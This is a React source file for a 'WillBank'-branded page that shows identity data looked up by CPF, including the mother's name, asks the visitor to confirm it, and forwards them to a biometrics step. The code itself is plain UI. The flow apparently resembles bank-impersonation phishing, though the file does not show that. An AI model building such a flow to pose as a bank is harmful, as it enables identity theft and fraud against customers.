import { useEffect } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Shield } from "lucide-react";
import WillBankHeader from "@/components/WillBankHeader";
import WillBankCard from "@/components/WillBankCard";
import { CPFData } from "@/lib/cpf";

const ConfirmaDados = () => {
  const navigate = useNavigate();
  const location = useLocation();

  const cpfData: CPFData | undefined = location.state?.cpfData;

  useEffect(() => {
    if (!cpfData) {
      navigate("/");
    }
  }, [cpfData, navigate]);

  const handleConfirmar = () => {
    navigate("/biometria", { state: { cpfData } });
  };

  const handleCorrigir = () => {
    navigate("/");
  };

  if (!cpfData) return null;

  const dataFields = [
    { label: "Nome completo", value: cpfData.nome },
    { label: "Data de nascimento", value: cpfData.dataNascimento },
    { label: "Nome da mãe", value: cpfData.nomeMae },
    { label: "CPF", value: cpfData.cpf },
    { label: "Sexo", value: cpfData.sexo },
  ];

  return (
    <div className="min-h-screen bg-background flex flex-col">
      <WillBankHeader userName={cpfData.nome.split(' ')[0].toUpperCase()} />

      <main className="flex-1 flex items-center justify-center p-4 sm:p-6">
        <WillBankCard className="w-full max-w-lg">
          <div className="space-y-6">
            <div className="text-center space-y-2">
              <h1 className="text-2xl font-bold text-foreground">
                Confirme se você é essa pessoa
              </h1>
              <p className="text-muted-foreground">
                Verifique se os dados estão corretos antes de continuar.
              </p>
            </div>

            {/* Data Fields */}
            <div className="border border-gray-200 rounded-xl divide-y divide-gray-200">
              {dataFields.map((field, index) => (
                <div key={index} className="p-4 text-center">
                  <p className="text-sm text-muted-foreground underline">{field.label}</p>
                  <p className="font-semibold text-foreground mt-1">{field.value}</p>
                </div>
              ))}
            </div>

            {/* Action Buttons */}
            <div className="space-y-3">
              <Button 
                onClick={handleConfirmar}
                className="w-full h-12 text-base font-semibold bg-primary hover:bg-primary/90 text-primary-foreground rounded-full"
              >
                Sim, sou eu
              </Button>
              
              <Button 
                onClick={handleCorrigir}
                variant="outline"
                className="w-full h-12 text-base font-medium rounded-full border-2"
              >
                Não sou eu, corrigir dados
              </Button>
            </div>

            {/* Security Badge */}
            <div className="flex items-center justify-center gap-2 text-muted-foreground pt-2">
              <Shield className="w-4 h-4 text-primary" />
              <span className="text-sm">Dados consultados de forma segura e oficial</span>
            </div>
          </div>
        </WillBankCard>
      </main>
    </div>
  );
};

export default ConfirmaDados;
